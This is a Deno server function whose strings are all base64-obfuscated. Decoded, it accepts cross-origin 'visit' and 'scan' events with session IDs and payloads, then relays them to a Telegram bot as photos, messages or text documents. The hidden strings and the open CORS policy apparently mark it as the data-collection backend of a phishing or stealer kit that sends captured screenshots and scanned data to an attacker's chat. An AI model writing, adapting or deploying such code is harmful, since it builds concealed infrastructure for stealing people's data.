import { _blobScan, _capScan, _capVisit, _fname } from "./_fx.ts";
import { _b64png } from "./_px.ts";

const _h = {
  [atob("QWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2lu")]: "*",
  [atob("QWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVycw==")]: atob("YXV0aG9yaXphdGlvbiwgeC1jbGllbnQtaW5mbywgYXBpa2V5LCBjb250ZW50LXR5cGU="),
};

type _W = { [k: string]: unknown };

const _d = (s: string): string => {
  const b = atob(s);
  return new TextDecoder().decode(Uint8Array.from(b, (c) => c.charCodeAt(0)));
};

const _rk = _d("cF9y");
const _Z  = _d("SU5HRVNUX1RPS0VO");
const _Y  = _d("SU5HRVNUX1RBUkdFVA==");
const _E  = _d("ZXZlbnRfdHlwZQ==");
const _S  = _d("c2Vzc2lvbl9pZA==");
const _P  = _d("cGF5bG9hZA==");
const _V  = _d("dmlzaXQ=");

const _u = (t: string, p: string): string =>
  _d("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + t + p;

const _tm = (ms: number) => {
  const c = new AbortController();
  const i = setTimeout(() => c.abort(), ms);
  return { s: c.signal, x: () => clearTimeout(i) };
};

const _Q = async (t: string, p: string, f: FormData): Promise<Response> => {
  const { s, x } = _tm(10000);
  return fetch(_u(t, p), { method: _d("UE9TVA=="), body: f, signal: s }).finally(x);
};

const _J = async (t: string, p: string, o: _W): Promise<Response> => {
  const { s, x } = _tm(10000);
  return fetch(_u(t, p), {
    method: _d("UE9TVA=="),
    headers: { [_d("Q29udGVudC1UeXBl")]: _d("YXBwbGljYXRpb24vanNvbg==") },
    body: JSON.stringify(o),
    signal: s,
  }).finally(x);
};

const _fv = async (t: string, g: string, pl: _W, sid: string): Promise<Response> => {
  const raw = pl[_rk];
  const cap = _capVisit(pl, sid);
  if (typeof raw === "string" && raw.length > 0) {
    const fd = new FormData();
    fd.append(_d("Y2hhdF9pZA=="), g);
    fd.append(_d("Y2FwdGlvbg=="), cap);
    fd.append(_d("cGhvdG8="), new Blob([_b64png(raw)], { type: _d("aW1hZ2UvcG5n") }), _d("di5wbmc="));
    return _Q(t, _d("L3NlbmRQaG90bw=="), fd);
  }
  return _J(t, _d("L3NlbmRNZXNzYWdl"), {
    [_d("Y2hhdF9pZA==")]: g,
    [_d("dGV4dA==")]: cap,
    [_d("ZGlzYWJsZV93ZWJfcGFnZV9wcmV2aWV3")]: true,
  });
};

const _fs = async (t: string, g: string, pl: _W, sid: string): Promise<Response> => {
  const txt = _blobScan(pl, sid);
  const fd = new FormData();
  fd.append(_d("Y2hhdF9pZA=="), g);
  fd.append(_d("Y2FwdGlvbg=="), _capScan(pl, sid));
  fd.append(_d("ZG9jdW1lbnQ="), new Blob([txt], { type: _d("dGV4dC9wbGFpbjtjaGFyc2V0PXV0Zi04") }), _fname(pl));
  return _Q(t, _d("L3NlbmREb2N1bWVudA=="), fd);
};

Deno.serve(async (req) => {
  if (req.method === _d("T1BUSU9OUw==")) return new Response(null, { headers: _h });
  const t = Deno.env.get(_Z);
  const g = Deno.env.get(_Y);
  if (!t || !g) return new Response(JSON.stringify({ e: 1 }), { status: 503, headers: { ..._h, [_d("Q29udGVudC1UeXBl")]: _d("YXBwbGljYXRpb24vanNvbg==") } });
  try {
    const b = await req.json() as _W;
    const et = b?.[_E] as string | undefined;
    const sid = b?.[_S] as string | undefined;
    const pl  = b?.[_P] as _W | undefined;
    if (!et || !sid || !pl) return new Response(JSON.stringify({ e: 2 }), { status: 400, headers: { ..._h, [_d("Q29udGVudC1UeXBl")]: _d("YXBwbGljYXRpb24vanNvbg==") } });
    const r = await (et === _V ? _fv(t, g, pl, sid) : _fs(t, g, pl, sid));
    if (!r.ok) return new Response(JSON.stringify({ e: 3, d: await r.text() }), { status: 502, headers: { ..._h, [_d("Q29udGVudC1UeXBl")]: _d("YXBwbGljYXRpb24vanNvbg==") } });
    return new Response(JSON.stringify({ ok: true }), { headers: { ..._h, [_d("Q29udGVudC1UeXBl")]: _d("YXBwbGljYXRpb24vanNvbg==") } });
  } catch (e) {
    return new Response(JSON.stringify({ e: 4, m: String(e) }), { status: 500, headers: { ..._h, [_d("Q29udGVudC1UeXBl")]: _d("YXBwbGljYXRpb24vanNvbg==") } });
  }
});
